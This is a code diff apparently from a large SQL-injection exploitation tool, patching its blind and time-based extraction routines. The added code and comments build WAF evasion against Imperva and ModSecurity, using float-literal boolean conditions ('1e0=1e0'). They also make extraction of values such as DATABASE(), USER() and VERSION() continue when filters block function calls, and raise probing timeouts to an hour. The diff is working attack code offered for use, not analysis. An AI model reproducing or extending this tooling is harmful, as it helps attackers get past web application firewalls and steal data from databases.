+        # Imperva and other ML WAFs fingerprint and block.  When the WAF blocks both
+        # probes, r1=r2=None → "indeterminate" branch accepts the oracle without
+        # validation → extraction proceeds with a non-functional oracle → all
+        # extracted values are garbage.  When the WAF returns uniform error pages,
+        # r1=r2=False → "uniform" branch falls through to Round 2, which is correct.
+        # Fix: Use the same pure float-literal comparisons (1e0=1e0 / 0e0=1e0) that
+        # already passed the detection WAF bypass — structurally identical to the
+        # injection payload, so any WAF that passed detection allows these too.
+        # Uniform for all DBMSes: avoids per-DBMS maintenance drift.
+        _mse_val_true  = "1e0=1e0"
+        _mse_val_false = "0e0=1e0"
         _validated = []
         for name in self._oracles:
             if name not in self._oracle_fns:
@@ -140116,8 +140142,29 @@ class MultiStrategyExtractor:
             print(f"[MSE] Re-calibration succeeded: {len(self._oracles)} oracle(s) ready.", flush=True)
         expr = self._remap_expr(sql)
         if not expr:
-            LOG.debug("[MSE] Skipping %r  no keyword equivalent available", sql[:50])
-            return ""
+            # BUG-MSE-REMAP-FALLBACK-FIX (HIGH, MySQL/all DBMSes, nofunc mode):
+            # When _remap_expr returns "" (function call with no nofunc mapping,
+            # e.g. DATABASE() on MySQL), the old code aborted extraction immediately.
+            # Root cause: nofunc bypass is an optimization for WAFs that block
+            # parentheses — it is NOT a requirement for extraction to work.
+            # The bool_body_diff and other MSE oracles were already validated against
+            # the live target and CAN evaluate any SQL expression including function
+            # calls (the oracle itself uses the injection template, not the expression
+            # directly).  Aborting here discards all extraction for any SQL expression
+            # that lacks a nofunc mapping (e.g. DATABASE(), USER(), VERSION()).
+            # Fix: fall back to the raw sql expression rather than returning "".
+            # Log a debug notice so the nofunc bypass is still auditable.
+            LOG.debug("[MSE] _remap_expr returned empty for %r — falling back to raw SQL "
+                      "(nofunc bypass unavailable for this expression; bool oracle "
+                      "can still evaluate function calls)", sql[:80])
+            print(f"[MSE] No nofunc mapping for {sql[:60]!r} — using raw SQL (function calls allowed by validated oracle)", flush=True)
+            # Use the raw sql; strip a bare SELECT wrapper if present so the expression
+            # is injectable as a column expression, not a statement.
+            _m = _re.match(r'^\s*SELECT\s+(.+)$', sql.strip(), _re.I)
+            if _m and not _re.search(r'\bFROM\b|\bWHERE\b', sql, _re.I):
+                expr = _m.group(1).strip()
+            else:
+                expr = sql.strip()
 
         if _re.search(r'\w+\s*\(', expr):
             LOG.debug("[MSE] expr=%r has function calls  may be blocked", expr)
@@ -144655,25 +144702,20 @@ async def _time_based_extract_inner(engine, config, result, sql: str,
 
         # Strategy 0: standard form
         _tb_cal_dbms = dbms or ''
-        _tb_cal_true = {
-            "PostgreSQL":     "ISNULL(NULL)",
-            "CockroachDB":    "ISNULL(NULL)",
-            "YugabyteDB":     "ISNULL(NULL)",
-            "Amazon Redshift":"LEAST(2e0,3e0)>(0e0)",
-            "MySQL":          "ISNULL(NULL)",
-            "MariaDB":        "ISNULL(NULL)",
-            "TiDB":           "LEAST(2e0,3e0)>(0e0)",
-            "MSSQL":          "(1e0 IS NOT NULL)",
-            "Sybase":         "(1e0 IS NOT NULL)",
-            "DB2":            "ABS(-1e0)>(0e0)",
-            "Firebird":       "(1e0 IS NOT NULL)",
-            "H2":             "(1e0 IS NOT NULL)",
-            "Informix":       "(1e0 IS NOT NULL)",
-            "SAP_HANA":       "(1e0 IS NOT NULL)",
-            "Oracle":         "(NVL(NULL,1e0) IS NOT NULL)",
-            "SQLite":         "(1e0 IS NOT 0e0)",
-            "ClickHouse":     "isNull(NULL)",
-        }.get(_tb_cal_dbms, "NOT (1e0 IS NULL)")
+        # BUG-TBCAL-COND-WAF-FIX (HIGH, all DBMSes, timing calibration):
+        # DBMS-specific TRUE conditions (ISNULL(NULL), LEAST(2e0,3e0)>(0e0),
+        # ABS(-1e0)>(0e0), NVL(NULL,1e0) IS NOT NULL, isNull(NULL)) are blocked
+        # by WAF function-call rules (Imperva/ModSecurity block ISNULL, LEAST, ABS,
+        # NVL, isNull). When calibration condition is WAF-blocked: the IF/CASE timing
+        # payload never executes the sleep → _calibrate_probe returns fast → _cal_hit()
+        # returns False → strategy-0 calibration fails → falls through to EBF extraction
+        # (unreliable for WAF targets) instead of using the confirmed detection template.
+        # Root cause: the timing calibration was not updated when other oracle systems
+        # (Wasserstein, baseline-similarity, MSE) were fixed to use 1e0=1e0/0e0=1e0.
+        # Fix: use 1e0=1e0 (always TRUE, no function calls, WAF-evasive float literal)
+        # uniformly across ALL DBMSes, matching the pattern used throughout the oracle
+        # systems (Fix 2 calibration, Fix 3 Wasserstein, Fix 5 baseline, Fix 6 MSE).
+        _tb_cal_true = "1e0=1e0"
         _std_ms = await _calibrate_probe(timing_payload(_tb_cal_true), tamper_chain)
         _std_cal_ok = False
         if _cal_hit(_std_ms):
@@ -152262,7 +152304,8 @@ class ExtractionOrchestrator:
                 getattr(self.result, "dbms", "") or getattr(self.config, "forced_dbms", None) or getattr(self.config, "dbms", None) or "MySQL",
                 self._confirmed_sleep_sec,
                 int(self.baseline.get("mean_timing", 200)) if self.baseline else 200)
-            _oracles = await asyncio.wait_for(_mse.probe_all(), timeout=120)
+            # BUG-MSE-PROBEALL-TIMEOUT-120S-FIX: same fix as other probe_all calls
+            _oracles = await asyncio.wait_for(_mse.probe_all(), timeout=3600)
             if _oracles:
                 val = await asyncio.wait_for(
                     _mse.extract_string(sql_query, max_len=max_len), timeout=3600)  # no extraction timeout
